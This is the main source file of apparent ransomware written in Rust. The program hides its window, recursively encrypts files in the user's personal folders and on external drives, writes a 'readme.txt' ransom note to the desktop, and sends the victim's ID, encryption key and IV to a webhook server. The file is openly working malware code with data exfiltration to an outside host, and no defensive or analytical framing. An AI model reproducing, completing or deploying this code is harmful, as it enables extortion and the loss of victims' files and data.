#![windows_subsystem = "windows"]

use rayon::prelude::*;
use reqwest::blocking::Client;
use std::{collections, fs, io::Write, path};

mod constants;
mod crypto;
mod filesystem;

fn encrypt_local_filesystem(customer: &crypto::Customer) {
    let folders = vec![
        "Music",
        "Videos",
        "Pictures",
        "Documents",
        "Downloads",
        "OneDrive",
        "Desktop",
    ];

    folders.par_iter().for_each(|folder| {
        walk_dir(
            path::Path::new(&format!(
                "{}\\{}",
                &dirs::home_dir().unwrap().display(),
                *folder
            )),
            customer,
        );
    });
}

fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
    if let Ok(contents) = fs::read_dir(path) {
        contents.par_bridge().into_par_iter().for_each(|entry| {
            let entry = entry.unwrap();
            match filesystem::check_dir_entry(&entry.path()) {
                0 => {
                    walk_dir(&entry.path(), customer);
                }
                1 => {
                    crypto::encrypt(&entry.path(), customer);
                }
                _ => (),
            }
        });
    }
}

pub fn report(message: &str) {
    let mut map = collections::HashMap::new();
    map.insert("content", message.to_string());

    let _response = Client::new()
        .post(constants::WEBHOOK_URL)
        .json(&map)
        .send()
        .expect("Server connection failed");
}

fn create_ransom_note(customer: &crypto::Customer) {
    let ransom_note = format!("You may need this: {}", customer.identification);
    let desktop = dirs::home_dir().unwrap().join("Desktop");
    let onedrive_desktop = dirs::home_dir().unwrap().join("OneDrive").join("Desktop");
    if onedrive_desktop.exists() {
        let mut file = fs::File::create(onedrive_desktop.join("readme.txt")).unwrap();
        file.write_all(ransom_note.as_bytes()).unwrap();
    } else {
        let mut file = fs::File::create(desktop.join("readme.txt")).unwrap();
        file.write_all(ransom_note.as_bytes()).unwrap();
    }
}

fn main() {
    let customer = crypto::get_id();
    report(&format!(
        "**New client:** `{}`\n**Keypair:** `{}`, `{}`",
        &customer.identification, &customer.keypair.key, &customer.keypair.iv
    ));
    encrypt_local_filesystem(&customer);
    create_ransom_note(&customer);
    for entry in filesystem::get_external_drives() {
        walk_dir(&entry, &customer);
    }
}
